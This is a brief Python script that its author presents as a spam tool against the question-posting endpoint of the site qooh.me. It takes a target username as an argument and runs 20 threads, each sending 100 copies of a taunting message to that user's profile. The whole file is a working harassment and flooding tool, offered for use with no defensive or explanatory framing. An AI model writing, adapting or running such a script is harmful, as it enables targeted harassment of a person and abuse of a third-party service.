# made by track aka Track3CC aka Track Projects inc

import sys
import threading
import requests


def spam(index):
    endpoint = 'http://qooh.me/processes/userprofile/index.php'
    data = {
        "ajax": "post_question",
        "user": sys.argv[1],
        "question": "ur being yeeted by track", # the message to be sent
        "hp": ""
    }

    count = 0

    while count < 100: # number of messages per thread
        r = requests.post(endpoint, data)
        count += 1
        print 'sent - ' + str(count) + ' | ' + str(index)


if __name__ == "__main__":
        threads = list()
        
        for index in range(20): # number of threads also controlls the speed of the spam
                x = threading.Thread(target=spam, args=(index, ))
                threads.append(x)
                x.start()
        
        for index, thread in enumerate(threads):
                thread.join()
